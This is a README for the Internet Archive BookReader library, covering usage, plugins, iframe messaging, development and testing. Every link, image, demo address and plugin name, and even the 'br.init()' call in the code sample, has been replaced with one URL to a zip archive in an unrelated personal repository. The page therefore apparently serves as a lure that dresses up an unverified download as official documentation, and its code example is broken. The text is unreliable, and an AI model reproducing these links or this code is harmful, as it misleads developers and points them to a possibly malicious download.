# Internet Archive BookReader

![Build Status](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip) [![codecov](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip)](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip)

**Disclaimer: BookReader v5 is currently in beta. It is stable enough for production use and is actively deployed on https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip Future updates while in v5 beta may introduce breaking changes to public BookReader APIs, although these will be noted in the CHANGELOG.**


<p align="center">
  <img width="200" src="https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip" alt="Internet Archive BookReader full logo">
</p>


<div style="border: 1px solid gray; padding: 2px; margin-bottom: 20px"><img src="https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip" alt="BookReader v5 interface screenshot"></div>


The Internet Archive BookReader is used to view books from the Internet Archive online and can also be used to view other books.

See live examples:
- On details page: https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip
- Full window: https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip
- Embedded url for iFrames: https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip

## Demos

See `BookReaderDemo` directory. These can be tested by building the source files (make sure [https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip is installed](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip)):

```bash
npm run build
```

and starting a simple web server in the root directory:

```
npm run serve
```

And then open `https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip`.


## Usage

Here is a short example.

```js
// Create the BookReader object
var options = {
  data: [
    [
      { width: 800, height: 1200,
        uri: 'https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip' },
    ],
    [
      { width: 800, height: 1200,
        uri: 'https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip' },
      { width: 800, height: 1200,
        uri: 'https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip' },
    ],
    [
      { width: 800, height: 1200,
        uri: 'https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip' },
      { width: 800, height: 1200,
        uri: 'https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip' },
    ]
  ],

  bookTitle: 'Simple BookReader Presentation',

  // thumbnail is optional, but it is used in the info dialog
  thumbnail: 'https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip',

  // Metadata is optional, but it is used in the info dialog
  metadata: [
    {label: 'Title', value: 'Open Library BookReader Presentation'},
    {label: 'Author', value: 'Internet Archive'},
    {label: 'Demo Info', value: 'This demo shows how one could use BookReader with their own content.'},
  ],

  ui: 'full', // embed, full (responsive)

};
var br = new BookReader(options);

// Let's go!
https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip();

```
## Architecture Overview
Starting at v5, BookReader introduces hybrid architecture that merges the core code written in jQuery closer to its evolution as a web component.  As we march toward the future of BookReader as a web component, we are taking an Event Driven approach to connect the two together.

Approach:
- Event driven
  - BookReader's (BR) core code emits [custom events](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip), reporting the actions it takes:
    - UI changes
      - Core Events [https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip)
    - API returns
      - Search API [https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip)
  - BookNavigator, BR's web components controller, listens and reacts to these events in order to populate the side menu panels
- Control BR from the outside by using public methods
  - When BookNavigator reacts to BR's events, BookNavigator can directly control BR core using public functions.
    - As we continue to decouple the UI from drawing/calculating logic, these logical methods will become easier to spot, raise as a public method, and create unit tests for them.

### Menu panels: Web Components via LitElement
BookReader's side navigation is powered by LitElement flavored web components.


### Core: jQuery
BookReader's core functionality is in jQuery.
This includes:
- drawing & resizing the book and the various modes (1up, 2 page spread, gallery view)
- the horizontal navigation
- search API service
- plugins

A peek in how to use/extend core functionality:
- Properties
  - TODO (for now see [https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip))
- Plugins
  - A basic plugin system is used. See the examples in the plugins directory. The general idea is that they are mixins that augment the BookReader prototype. See the plugins directory for all the included plugins, but here are some examples:
    - https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip - autoplay mode. Flips pages at set intervals.
    - https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip - render chapter markers
    - https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip - add search ui, and callbacks
    - https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip - add tts (read aloud) ui, sound library, and callbacks
    - https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip - automatically updates the browser url
    - https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip - uses cookies to remember the current page
    - https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip - replaces fullscreen mode with vendor native fullscreen
    - see [plugin directory for current plugin files](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip)

### Embedding BookReader in an iFrame

BookReader can be embedded within an `<iframe>`. If you use the IFrame Plugin inside the `<iframe>`, the reader will send notifications about changes in the state of the reader via [`https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip()`](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip). The parent window can send messages of its own (also via `https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip()`) and the IFrame Plugin will handle updating the reader to match.

### Message Events

#### Fragment Change
The Fragment Change message is sent to the parent window when the embedded BookReader moves between pages/modes. When the `<iframe>` receives this message, it moves to the specified page/mode. The “fragment” is formatted in accordance with the [BookReader URL spec](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip).

```json
{
  "type": "bookReaderFragmentChange",
  "fragment": "page/n1/mode/2up"
}
```

## Development

(updates?)

The source JavaScript is written in ES6 (located in the `src/js` directory) and in ES5 (located in `BookReader`). `npm run serve-dev` starts an auto-reloading dev server, that builds js/css that has been edited at `localhost:8000`.

### Developing icons
To see local icon package changes in bookreader, you'll need to install core-js into the icon package and link into bookreader.

Let's use `icon-share` as an example.
1.  Confirm your icon package is working properly in the iaux-icons demo
2.  Navigate to your icon package (`iaux-icons/packages/icon-share`) and run command: `npm install core-js`
    -  You shouldn't need to commit any of these core-js changes
3.  From within your icon package directory run command: `npm link`
    -  You can use the command `npm ls -g` to confirm your local package now appears in the registry
4.  Navigate to `/bookreader` and run command: `npm link @internetarchive/icon-share`
    -  You can use the command `npm ls |grep icon-share` to confirm icon-share is now a link to your local directory
5. You may now start a local server to see your changes by running command: `npm run serve-dev`

## Releases

To version bump the repo and prepare a release, run `npm version major|minor|patch` (following [semver](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip)), then (something like) `git push origin HEAD --tags`. It'll automatically update the version number where it appears, build the files, and ask you to update the CHANGELOG.

We release BookReader [in-repo as tags](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip) & also as a node module [@internetarchive/bookreader](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip)

## Tests
We would like to get to 100% test coverage and are tracking our progress in this project: [BookReader Fidelity](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip)

### End to end tests
We also have end to end tests using [Testcafe](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip).  We write tests for the repo itself and also for our use on https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip You can read about them in [here](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip). These are relatively easy to do, and a fantastic way of getting introduced to the wonders of BookReader.  Check the project board for open tickets to work on.  And if you don't see a test for something you spotted, feel free to make an issue.

To run all local end to end tests, run command: `npm run test:e2e`

To keep end to end test server on while developing, run command: `npm run test:e2e:dev`

### Unit tests
We have unit tests and use Jest to run them.
For mocks, we use Jest's internal mocking mechanism and Sinon to set spies.

To run all local unit tests, run command: `npm run test`

## Ways to contribute

We can always use a hand building BookReader.  Check out the issues and see what interests you.  If you have an idea for an improvement, open an issue.

## More info

Developer documentation:
https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip

Hosted source code:
https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip

IIIF (https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip)
See `https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip` to see an example of how to load an IIIF manifest in BookReader.


## Target Devices

Note that BookReader is a core part of https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip's mission of Universal Access to All Knowledge. Therefore, care must be taken to support legacy browsers. It should still work and be useable on old devices.


## Areas for improvement
- Change libraries to be NPM dependencies rather than included in the source code

See [https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip) for history of the project.


## License
The source code license is AGPL v3, as described in the LICENSE file.

## Other credits
The ability to test on multiple devices is provided courtesy of [Browser Stack](https://raw.githubusercontent.com/Gurleen-kansray/bookreader/master/locutorship/bookreader.zip).
